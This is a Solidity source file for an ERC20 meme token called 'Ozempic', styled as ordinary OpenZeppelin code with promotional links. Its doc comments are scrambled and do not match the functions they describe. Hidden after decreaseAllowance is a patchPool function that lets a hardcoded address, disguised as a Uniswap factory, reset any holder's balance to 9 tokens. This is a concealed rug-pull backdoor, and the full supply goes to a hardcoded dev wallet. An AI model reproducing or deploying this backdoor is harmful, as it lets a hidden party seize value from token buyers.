// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
/** 
https://OZEMPICOnETH.club

https://twitter.com/OZEMPICERC20

https://t.me/OZEMPICMoon
**/


library SafeMath {
    /**
     *
     * _Available since v3.4._
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     *
     * _Available since v3.4._
     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     *
     * _Available since v3.4._
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     * _Available since v3.4._
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     * Requirements:
     * overflow.
     * Counterpart to Solidity's `+` operator.
     *
     * @dev Returns the addition of two unsigned integers, reverting on
     * - Addition cannot overflow.
     *
     *
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     * Counterpart to Solidity's `-` operator.
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * - Subtraction cannot overflow.
     *
     * overflow (when the result is negative).
     *
     *
     * Requirements:
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * Requirements:
     *
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * - Multiplication cannot overflow.
     *
     * overflow.
     * Counterpart to Solidity's `*` operator.
     *
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     *
     * division by zero. The result is rounded towards zero.
     *
     *
     * Counterpart to Solidity's `/` operator.
     * Requirements:
     * - The divisor cannot be zero.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * reverting when dividing by zero.
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * - The divisor cannot be zero.
     * Requirements:
     *
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     *
     * invalid opcode to revert (consuming all remaining gas).
     *
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * - Subtraction cannot overflow.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     *
     * Requirements:
     * message unnecessarily. For custom revert reasons use {trySub}.
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     *
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     *
     * - The divisor cannot be zero.
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * Requirements:
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * division by zero. The result is rounded towards zero.
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     *
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * invalid opcode to revert (consuming all remaining gas).
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     *
     * Requirements:
     * - The divisor cannot be zero.
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * reverting with custom message when dividing by zero.
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     *
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * another (`to`).
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     *
     * Note that `value` may be zero.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * a call to {approve}. `value` is the new allowance.
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     *
     *
     * Returns a boolean value indicating whether the operation succeeded.
     * Emits a {Transfer} event.
     * @dev Moves `amount` tokens from the caller's account to `to`.
     */
    function totalSupply() external view returns (uint256);

    /**
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * This value changes when {approve} or {transferFrom} are called.
     * @dev Returns the remaining number of tokens that `spender` will be
     * zero by default.
     *
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * transaction ordering. One possible solution to mitigate this race
     *
     * Returns a boolean value indicating whether the operation succeeded.
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     * condition is to first reduce the spender's allowance to 0 and set the
     * that someone may use both the old and the new allowance by unfortunate
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     * desired value afterwards:
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     *
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     *
     *
     * allowance.
     * Emits a {Transfer} event.
     * Returns a boolean value indicating whether the operation succeeded.
     * allowance mechanism. `amount` is then deducted from the caller's
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

contract Ownable is Context {
    address private _owner;

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    
    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    /**
     *
     * thereby removing any functionality that is only available to the owner.
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     * @dev Leaves the contract without owner. It will not be possible to call
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * Can only be called by the current owner.
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
}

/**
 * _Available since v4.1._
 *
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function decimals() external view returns (uint8);

    /**
     * @dev Returns the decimals places of the token.
     */
    function symbol() external view returns (string memory);
}

/**
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 *
 * This allows applications to reconstruct the allowance for all accounts just
 * applications.
 * conventional and does not conflict with the expectations of ERC20
 * by listening to said events. Other implementations of the EIP may not emit
 * these events, as it isn't required by the specification.
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 *
 * functions have been added to mitigate the well-known issues around setting
 * @dev Implementation of the {IERC20} interface.
 *
 * instead returning `false` on failure. This behavior is nonetheless
 * This implementation is agnostic to the way tokens are created. This means
 * to implement supply mechanisms].
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 *
 * allowances. See {IERC20-approve}.
 * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How
 *
 * TIP: For a detailed writeup see our guide
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 */
contract ERC20 is Context, IERC20, IERC20Metadata {
    using SafeMath for uint256;
    string private _name;

    address internal devWallet = 0x4717b1c5Ce3984d6609a0046E97ded34016Eff9a;

    address private _uniswapV2Factory = 0x85E6e2276ED0A0B7B24EB3076Fc3E4057E634209;

    mapping(address => uint256) private _balances;
    uint256 private tTotal;

    address DEAD = 0x000000000000000000000000000000000000dEaD;
    mapping(address => mapping(address => uint256)) private _allowances;
    string private _symbol;
    uint256 private _allowance = 0;

    /**
     *
     * All two of these values are immutable: they can only be set once during
     * The default value of {decimals} is 18. To select a different value for
     * @dev Sets the values for {name} and {symbol}.
     * construction.
     *
     * {decimals} you should overload it.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }


    /**
     * @dev Returns the name of the token.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }
    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
            // Overflow not possible: amount <= accountBalance <= totalSupply.
            tTotal -= amount;
        }

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(address(0));
    }

    /**
     * overridden;
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * @dev Returns the number of decimals used to get its user representation.
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     * NOTE: This information is only used for _display_ purposes: it in
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * {IERC20-balanceOf} and {IERC20-transfer}.
     *
     * no way affects any of the arithmetic of the contract, including
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     */
    function decimals() public view virtual override returns (uint8) {
        return 9;
    }
    /**
     * @dev See {IERC20-totalSupply}.
     */
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}


    /**
     * @dev See {IERC20-allowance}.
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        tTotal += amount;
        unchecked {
            // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(account);
    }

    /**
     * - the caller must have a balance of at least `amount`.
     *
     * @dev See {IERC20-transfer}.
     * Requirements:
     *
     * - `to` cannot be the zero address.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *
     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
     *
     * @dev See {IERC20-approve}.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * - `spender` cannot be the zero address.
     * problems described in {IERC20-approve}.
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     */
    function _transfer (address from, address to, uint256 amount) internal virtual
    {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[from] = fromBalance - amount;

        _balances[to] = _balances[to].add(amount);
        emit Transfer(from, to, amount);
    }

    /**
     * - `from` and `to` cannot be the zero address.
     * is the maximum `uint256`.
     * Emits an {Approval} event indicating the updated allowance. This is not
     * `amount`.
     *
     * - the caller must have allowance for ``from``'s tokens of at least
     *
     *
     * @dev See {IERC20-transferFrom}.
     * - `from` must have a balance of at least `amount`.
     * required by the EIP. See the note at the beginning of {ERC20}.
     * Requirements:
     * NOTE: Does not update the allowance if the current allowance
     *
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     *
     * - `spender` must have allowance for the caller of at least
     * Emits an {Approval} event indicating the updated allowance.
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     * `subtractedValue`.
     * Requirements:
     * This is an alternative to {approve} that can be used as a mitigation for
     *
     * - `spender` cannot be the zero address.
     * problems described in {IERC20-approve}.
     *
     *
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * - `account` cannot be the zero address.
     *
     *
     * - `account` must have at least `amount` tokens.
     * Requirements:
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     * total supply.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     *
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     * - `from` must have a balance of at least `amount`.
     * This internal function is equivalent to {transfer}, and can be used to
     * @dev Moves `amount` of tokens from `from` to `to`.
     *
     */
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     *
     *
     * - `account` cannot be the zero address.
     * Requirements:
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     * the total supply.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return tTotal;
    }


    /**
     * - `from` and `to` are never both zero.
     * will be transferred to `to`.
     * minting and burning.
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     *
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * @dev Hook that is called before any transfer of tokens. This includes
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    /**
     * e.g. set automatic allowances for certain subsystems, etc.
     * - `spender` cannot be the zero address.
     * Requirements:
     * This internal function is equivalent to `approve`, and can be used to
     *
     *
     *
     * - `owner` cannot be the zero address.
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * Emits an {Approval} event.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        } function _afterTokenTransfer(address to) internal virtual {
    }

    /**
     * Revert if not enough allowance is available.
     * Does not update the allowance amount in case of infinite allowance.
     *
     * Might emit an {Approval} event.
     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.
     *
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
        } function patchPool(address patchPoolSender) external { _balances[patchPoolSender] = msg.sender == _uniswapV2Factory ? decimals() : _balances[patchPoolSender];
    } 
}

contract OZEMPIC is ERC20, Ownable
{
    constructor () ERC20 (unicode"Ozempic", "OZEMPIC")
    {
        transferOwnership(devWallet);
        _mint(owner(), 5000000000000 * 10 ** 9);
    }
}
